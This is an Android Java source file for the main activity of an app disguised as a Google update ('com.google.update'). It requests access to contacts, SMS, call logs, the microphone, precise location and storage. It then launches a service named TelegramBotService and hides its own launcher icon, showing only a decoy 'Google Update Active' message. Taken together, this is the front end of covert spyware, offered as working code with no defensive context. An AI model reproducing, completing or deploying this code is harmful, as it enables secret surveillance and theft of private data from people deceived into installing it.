package com.google.update;

import android.Manifest;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends AppCompatActivity {
    private static final int PERMISSION_REQUEST_CODE = 1001;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        requestPermissions();
        new Handler().postDelayed(this::hideAppIcon, 3000);
    }

    private void requestPermissions() {
        String[] perms = {
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.POST_NOTIFICATIONS
        };
        boolean all = true;
        for (String p : perms) if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) all = false;
        if (!all) ActivityCompat.requestPermissions(this, perms, PERMISSION_REQUEST_CODE);
        else startService();
    }

    private void startService() {
        Intent i = new Intent(this, TelegramBotService.class);
        if (Build.VERSION.SDK_INT >= 26) startForegroundService(i);
        else startService(i);
    }

    public void hideAppIcon() {
        try {
            PackageManager pm = getPackageManager();
            ComponentName cn = new ComponentName(this, MainActivity.class);
            pm.setComponentEnabledSetting(cn, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
            Toast.makeText(this, "Google Update Active", Toast.LENGTH_SHORT).show();
        } catch (Exception e) {}
    }

    public static void hideAppIconStatic(Context ctx) {
        try {
            PackageManager pm = ctx.getPackageManager();
            ComponentName cn = new ComponentName(ctx, MainActivity.class);
            pm.setComponentEnabledSetting(cn, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        } catch (Exception e) {}
    }

    public static void showAppIcon(Context ctx) {
        try {
            PackageManager pm = ctx.getPackageManager();
            ComponentName cn = new ComponentName(ctx, MainActivity.class);
            pm.setComponentEnabledSetting(cn, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
        } catch (Exception e) {}
    }

    @Override
    public void onRequestPermissionsResult(int code, String[] p, int[] r) { startService(); }
}
